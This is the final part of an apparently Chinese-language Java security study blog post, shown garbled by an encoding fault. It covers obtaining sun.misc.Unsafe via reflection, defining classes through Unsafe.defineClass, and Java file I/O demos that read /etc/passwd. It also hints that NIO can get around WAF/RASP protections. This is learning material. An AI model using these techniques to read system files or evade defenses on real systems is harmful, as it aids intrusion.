        System.out.println(&quot;Instance created: &quot; + testInstance);
    }
}

</code></pre>
<p><strong>å…³äº(Unsafe) theUnsafeField.get(null);</strong><br>
<strong>Field</strong> ç±»çš„ <strong>get</strong> æ–¹æ³•å…è®¸ä½ åŠ¨æ€åœ°è·å–å­—æ®µçš„å€¼ã€‚å½“ä½ è°ƒç”¨ <strong>get</strong> æ–¹æ³•æ—¶ï¼Œä½ éœ€è¦ä¼ é€’ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œè¯¥å¯¹è±¡ä»£è¡¨ä½ æƒ³è¦è·å–å­—æ®µå€¼çš„ç±»çš„å®ä¾‹ã€‚ä½†æ˜¯ï¼Œå¯¹äºé™æ€å­—æ®µï¼Œä½ ä¸éœ€è¦å®ä¾‹å¯¹è±¡æ¥è·å–å­—æ®µçš„å€¼ï¼Œå› æ­¤ä½ å¯ä»¥ä¼ é€’ <strong>null</strong> ä½œä¸º <strong>get</strong> æ–¹æ³•çš„å‚æ•°ã€‚</p>
<p>ä¹Ÿå¯ä»¥ç”¨åå°„åˆ›å»ºUnsafeç±»å®ä¾‹çš„æ–¹å¼å»è·å–Unsafeå¯¹è±¡ï¼š</p>
<pre><code class="language-java">// è·å–Unsafeæ— å‚æ„é€ æ–¹æ³•
Constructor constructor = Unsafe.class.getDeclaredConstructor();

// ä¿®æ”¹æ„é€ æ–¹æ³•è®¿é—®æƒé™
constructor.setAccessible(true);

// åå°„åˆ›å»ºUnsafeç±»å®ä¾‹ï¼Œç­‰ä»·äº Unsafe unsafe1 = new Unsafe();
Unsafe unsafe1 = (Unsafe) constructor.newInstance();
</code></pre>
<h2 id=""></h2>
<p>defineClassç›´æ¥è°ƒç”¨JVMåˆ›å»ºç±»å¯¹è±¡<br>
å¦‚æœClassLoaderè¢«é™åˆ¶çš„æƒ…å†µä¸‹æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨Unsafeçš„defineClassæ–¹æ³•æ¥å®ç°åŒæ ·çš„åŠŸèƒ½ã€‚</p>
<p>Unsafeæä¾›äº†ä¸€ä¸ªé€šè¿‡ä¼ å…¥ç±»åã€ç±»å­—èŠ‚ç çš„æ–¹å¼å°±å¯ä»¥å®šä¹‰ç±»çš„defineClassæ–¹æ³•ï¼š</p>
<ul>
<li>public native Class defineClass(String var1, byte[] var2, int var3, int var4);</li>
<li>public native Class&lt;?&gt; defineClass(String var1, byte[] var2, int var3, int var4, ClassLoader var5, ProtectionDomain var6);</li>
</ul>
<p><strong>ä½¿ç”¨Unsafeåˆ›å»ºTestHelloWorldå¯¹è±¡ï¼š</strong></p>
<pre><code class="language-java">// ä½¿ç”¨Unsafeå‘JVMä¸­æ³¨å†Œcom.anbai.sec.classloader.TestHelloWorldç±»
Class helloWorldClass = unsafe1.defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length);
</code></pre>
<h1 id="java-æ–‡ä»¶ç³»ç»Ÿ">Java æ–‡ä»¶ç³»ç»Ÿ</h1>
<p>**JNIï¼š**JNIï¼ˆJava Native Interfaceï¼‰æ˜¯ä¸€ä¸ªæ ‡å‡†çš„ç¼–ç¨‹æ¡†æ¶ï¼Œå…è®¸Javaä»£ç ä¸å…¶ä»–è¯­è¨€ç¼–å†™çš„ä»£ç è¿›è¡Œäº¤äº’å’Œé›†æˆï¼Œæœ€å¸¸è§çš„æ˜¯Cå’ŒC++ã€‚è¿™</p>
<p>**nativeæ–¹æ³•ï¼š**åœ¨ Java ä¸­ï¼Œ<strong>native</strong> å…³é”®å­—ç”¨äºå£°æ˜ä¸€ä¸ªæ–¹æ³•æ˜¯åœ¨ Java ä¹‹å¤–çš„ä»£ç ä¸­å®ç°çš„ï¼Œé€šå¸¸æ˜¯åœ¨ C æˆ– C++ ä¸­ã€‚è¿™å…è®¸ Java é€šè¿‡ JNIï¼ˆJava Native Interfaceï¼‰ä¸å·²æœ‰çš„åº“æˆ–ç‰¹å®šäºå¹³å°çš„åŠŸèƒ½äº¤äº’ã€‚</p>
<p>åœ¨Java SEä¸­å†…ç½®äº†ä¸¤ç±»æ–‡ä»¶ç³»ç»Ÿï¼šjava.ioå’Œjava.nioï¼Œjava.nioçš„å®ç°æ˜¯sun.nioï¼Œæ–‡ä»¶ç³»ç»Ÿåº•å±‚çš„APIå®ç°å¦‚ä¸‹å›¾ï¼š<br>
<img src="https://skyblu3519.github.io/post-images/1694965002636.png" alt="" loading="lazy"><br>
JavaæŠ½è±¡å‡ºäº†ä¸€ä¸ªå«åšæ–‡ä»¶ç³»ç»Ÿçš„å¯¹è±¡:java.io.FileSystemï¼Œä¸åŒçš„æ“ä½œç³»ç»Ÿæœ‰ä¸ä¸€æ ·çš„æ–‡ä»¶ç³»ç»Ÿ,ä¾‹å¦‚Windowså’ŒUnixå°±æ˜¯ä¸¤ç§ä¸ä¸€æ ·çš„æ–‡ä»¶ç³»ç»Ÿï¼š java.io.UnixFileSystemã€java.io.WinNTFileSystemã€‚</p>
<p>Javaåªæ˜¯<strong>å®ç°äº†å¯¹æ–‡ä»¶æ“ä½œçš„å°è£…</strong>è€Œå·²ï¼Œæœ€ç»ˆè¯»å†™æ–‡ä»¶çš„å®ç°éƒ½æ˜¯é€šè¿‡<strong>è°ƒç”¨nativeæ–¹æ³•</strong>å®ç°çš„ã€‚</p>
<p>ä¸è¿‡éœ€è¦ç‰¹åˆ«æ³¨æ„ä¸€ä¸‹å‡ ç‚¹ï¼š</p>
<ol>
<li>å¹¶ä¸æ˜¯æ‰€æœ‰çš„æ–‡ä»¶æ“ä½œéƒ½åœ¨java.io.FileSystemä¸­å®šä¹‰,æ–‡ä»¶çš„è¯»å–æœ€ç»ˆè°ƒç”¨çš„æ˜¯java.io.FileInputStream#read0ã€readBytesã€java.io.RandomAccessFile#read0ã€readBytes,è€Œå†™æ–‡ä»¶è°ƒç”¨çš„æ˜¯java.io.FileOutputStream#writeBytesã€java.io.RandomAccessFile#write0ã€‚</li>
<li>Javaæœ‰ä¸¤ç±»æ–‡ä»¶ç³»ç»ŸAPIï¼ä¸€ä¸ªæ˜¯åŸºäºé˜»å¡æ¨¡å¼çš„IOçš„æ–‡ä»¶ç³»ç»Ÿï¼Œå¦ä¸€æ˜¯JDK7+åŸºäºNIO.2çš„æ–‡ä»¶ç³»ç»Ÿã€‚</li>
</ol>
<p>Java 7æå‡ºäº†ä¸€ä¸ªåŸºäºNIOçš„æ–‡ä»¶ç³»ç»Ÿï¼Œè¿™ä¸ªNIOæ–‡ä»¶ç³»ç»Ÿå’Œé˜»å¡IOæ–‡ä»¶ç³»ç»Ÿä¸¤è€…æ˜¯<strong>å®Œå…¨ç‹¬ç«‹</strong>çš„ã€‚åˆç†çš„åˆ©ç”¨NIOæ–‡ä»¶ç³»ç»Ÿè¿™ä¸€ç‰¹æ€§æˆ‘ä»¬å¯ä»¥ç»•è¿‡æŸäº›åªæ˜¯é˜²å¾¡äº†java.io.FileSystemçš„WAF/RASPã€‚</p>
<h2 id="è¯»å†™æ–‡ä»¶å®éªŒ">è¯»å†™æ–‡ä»¶å®éªŒ</h2>
<h3 id="fileinputstream">FileInputStream</h3>
<pre><code class="language-java">package filesystem;

import java.io.*;

public class FileInputStreamDemo {
    public static void main(String[] args) throws IOException {
        File file = new File(&quot;/etc/passwd&quot;);

        // æ‰“å¼€æ–‡ä»¶å¯¹è±¡å¹¶åˆ›å»ºæ–‡ä»¶è¾“å…¥æµ
        FileInputStream fis = new FileInputStream(file);

        // å®šä¹‰æ¯æ¬¡è¾“å…¥æµè¯»å–åˆ°çš„å­—èŠ‚æ•°å¯¹è±¡
        int a = 0;

        // å®šä¹‰ç¼“å†²åŒºå¤§å°
        byte[] bytes = new byte[1024];

        // åˆ›å»ºäºŒè¿›åˆ¶è¾“å‡ºæµå¯¹è±¡
        ByteArrayOutputStream out = new ByteArrayOutputStream();

        // å¾ªç¯è¯»å–æ–‡ä»¶å†…å®¹
        while ((a = fis.read(bytes)) != -1) {
            // æˆªå–ç¼“å†²åŒºæ•°ç»„ä¸­çš„å†…å®¹ï¼Œ(bytes, 0, a)å…¶ä¸­çš„0è¡¨ç¤ºä»bytesæ•°ç»„çš„
            // ä¸‹æ ‡0å¼€å§‹æˆªå–ï¼Œaè¡¨ç¤ºè¾“å…¥æµreadåˆ°çš„å­—èŠ‚æ•°ã€‚
            out.write(bytes, 0, a);
        }

        System.out.println(out.toString());
    }
}

</code></pre>
<h3 id="fileoutputstream">FileOutputStream</h3>
<pre><code class="language-java">package filesystem;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class FileOutputStreamDemo {
    public static void main(String[] args) throws IOException {
        // å®šä¹‰å†™å…¥æ–‡ä»¶è·¯å¾„
        File file = new File(&quot;./1.txt&quot;);

        // å®šä¹‰å¾…å†™å…¥æ–‡ä»¶å†…å®¹
        String content = &quot;Hello World.&quot;;

        // åˆ›å»ºFileOutputStreamå¯¹è±¡
        FileOutputStream fos = new FileOutputStream(file);

        // å†™å…¥å†…å®¹äºŒè¿›åˆ¶åˆ°æ–‡ä»¶
        fos.write(content.getBytes());
        fos.flush();
        fos.close();
    }
}

</code></pre>
<h3 id="randomaccessfile">RandomAccessFile</h3>
<p>java.io.FileInputStreamæ—¢å¯ä»¥è¯»å–æ–‡ä»¶ï¼Œè€Œä¸”è¿˜å¯ä»¥å†™æ–‡ä»¶ã€‚</p>
<pre><code class="language-java">package filesystem;

import java.io.*;

public class RandomAccessFileDemo {

    public static void main(String[] args) {
        // è¯»æ–‡ä»¶
        File file = new File(&quot;/etc/passwd&quot;);

        try {
            // åˆ›å»ºRandomAccessFileå¯¹è±¡,rè¡¨ç¤ºä»¥åªè¯»æ¨¡å¼æ‰“å¼€æ–‡ä»¶ï¼Œä¸€å…±æœ‰:r(åªè¯»)ã€rw(è¯»å†™)ã€
            // rws(è¯»å†™å†…å®¹åŒæ­¥)ã€rwd(è¯»å†™å†…å®¹æˆ–å…ƒæ•°æ®åŒæ­¥)å››ç§æ¨¡å¼ã€‚
            RandomAccessFile raf = new RandomAccessFile(file, &quot;r&quot;);

            // å®šä¹‰æ¯æ¬¡è¾“å…¥æµè¯»å–åˆ°çš„å­—èŠ‚æ•°å¯¹è±¡
            int a = 0;

            // å®šä¹‰ç¼“å†²åŒºå¤§å°
            byte[] bytes = new byte[1024];

            // åˆ›å»ºäºŒè¿›åˆ¶è¾“å‡ºæµå¯¹è±¡
            ByteArrayOutputStream out = new ByteArrayOutputStream();

            // å¾ªç¯è¯»å–æ–‡ä»¶å†…å®¹
            while ((a = raf.read(bytes)) != -1) {
                // æˆªå–ç¼“å†²åŒºæ•°ç»„ä¸­çš„å†…å®¹ï¼Œ(bytes, 0, a)å…¶ä¸­çš„0è¡¨ç¤ºä»bytesæ•°ç»„çš„
                // ä¸‹æ ‡0å¼€å§‹æˆªå–ï¼Œaè¡¨ç¤ºè¾“å…¥æµreadåˆ°çš„å­—èŠ‚æ•°ã€‚
                out.write(bytes, 0, a);
            }

            System.out.println(out.toString());
        } catch (IOException e) {
            e.printStackTrace();
        }
        
        // å†™æ–‡ä»¶
        File file2 = new File(&quot;./test.txt&quot;);

        // å®šä¹‰å¾…å†™å…¥æ–‡ä»¶å†…å®¹
        String content = &quot;Hello World.&quot;;

        try {
            // åˆ›å»ºRandomAccessFileå¯¹è±¡,rwè¡¨ç¤ºä»¥è¯»å†™æ¨¡å¼æ‰“å¼€æ–‡ä»¶ï¼Œä¸€å…±æœ‰:r(åªè¯»)ã€rw(è¯»å†™)ã€
            // rws(è¯»å†™å†…å®¹åŒæ­¥)ã€rwd(è¯»å†™å†…å®¹æˆ–å…ƒæ•°æ®åŒæ­¥)å››ç§æ¨¡å¼ã€‚
            RandomAccessFile raf = new RandomAccessFile(file2, &quot;rw&quot;);

            // å†™å…¥å†…å®¹äºŒè¿›åˆ¶åˆ°æ–‡ä»¶
            raf.write(content.getBytes());
            raf.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}
</code></pre>
<h3 id="filesystemprovider">FileSystemProvider</h3>
<p>å‰é¢ç« èŠ‚æåˆ°äº†JDK7æ–°å¢çš„NIO.2çš„java.nio.file.spi.FileSystemProvider,åˆ©ç”¨FileSystemProvideræˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ”¯æŒå¼‚æ­¥çš„é€šé“(Channel)æ¨¡å¼è¯»å–æ–‡ä»¶å†…å®¹ã€‚</p>
<h2 id="java-æ–‡ä»¶åç©ºå­—èŠ‚æˆªæ–­æ¼æ´">Java æ–‡ä»¶åç©ºå­—èŠ‚æˆªæ–­æ¼æ´</h2>
<p>2013å¹´9æœˆ10æ—¥å‘å¸ƒçš„Java SE 7 Update 40ä¿®å¤äº†ç©ºå­—èŠ‚æˆªæ–­è¿™ä¸ªå†å²é—ç•™é—®é¢˜ã€‚æ­¤æ¬¡æ›´æ–°åœ¨java.io.Fileç±»ä¸­æ·»åŠ äº†ä¸€ä¸ªisInvalidæ–¹æ³•ï¼Œä¸“é—¨æ£€æµ‹æ–‡ä»¶åä¸­æ˜¯å¦åŒ…å«äº†ç©ºå­—èŠ‚ã€‚</p>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#classloader">ClassLoader</a>
<ul>
<li><a href="#%E5%9F%BA%E7%A1%80%E7%9A%84%E5%9F%BA%E7%A1%80">åŸºç¡€çš„åŸºç¡€</a></li>
<li><a href="#classloader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B">ClassLoaderç±»åŠ è½½æµç¨‹</a></li>
<li><a href="#%E8%87%AA%E5%AE%9A%E4%B9%89classloader">è‡ªå®šä¹‰ClassLoader</a>
<ul>
<li><a href="#%E9%87%8D%E5%86%99findclass">é‡å†™findClass</a></li>
</ul>
</li>
<li><a href="#urlclassloader">URLClassLoader</a></li>
<li><a href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E9%9A%94%E7%A6%BB">ç±»åŠ è½½éš”ç¦»</a>
<ul>
<li><a href="#%E8%B7%A8%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8A%A0%E8%BD%BD">è·¨ç±»åŠ è½½å™¨åŠ è½½</a></li>
</ul>
</li>
<li><a href="#jsp%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%90%8E%E9%97%A8">JSPè‡ªå®šä¹‰ç±»åŠ è½½åé—¨</a></li>
<li><a href="#%E5%BE%85%E5%8A%9E">å¾…åŠ</a></li>
</ul>
</li>
<li><a href="#java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6">Javaåå°„æœºåˆ¶</a>
<ul>
<li><a href="#%E8%8E%B7%E5%8F%96class%E5%AF%B9%E8%B1%A1">è·å–Classå¯¹è±¡</a></li>
<li><a href="#%E5%8F%8D%E5%B0%84javalangruntime">åå°„java.lang.Runtime</a></li>
</ul>
</li>
<li><a href="#sunmiscunsafe">sun.misc.Unsafe</a>
<ul>
<li><a href="#%E8%8E%B7%E5%8F%96unsafe%E5%AF%B9%E8%B1%A1">è·å–Unsafeå¯¹è±¡</a></li>
<li></li>
</ul>
</li>
<li><a href="#java-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">Java æ–‡ä»¶ç³»ç»Ÿ</a>
<ul>
<li><a href="#%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%E5%AE%9E%E9%AA%8C">è¯»å†™æ–‡ä»¶å®éªŒ</a>
<ul>
<li><a href="#fileinputstream">FileInputStream</a></li>
<li><a href="#fileoutputstream">FileOutputStream</a></li>
<li><a href="#randomaccessfile">RandomAccessFile</a></li>
<li><a href="#filesystemprovider">FileSystemProvider</a></li>
</ul>
</li>
<li><a href="#java-%E6%96%87%E4%BB%B6%E5%90%8D%E7%A9%BA%E5%AD%97%E8%8A%82%E6%88%AA%E6%96%AD%E6%BC%8F%E6%B4%9E">Java æ–‡ä»¶åç©ºå­—èŠ‚æˆªæ–­æ¼æ´</a></li>
</ul>
</li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">ä¸‹ä¸€ç¯‡</div>
            <a href="https://skyblu3519.github.io/post/nctf2019sqli/">
              <h3 class="post-title">
                [NCTF2019]SQLi
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
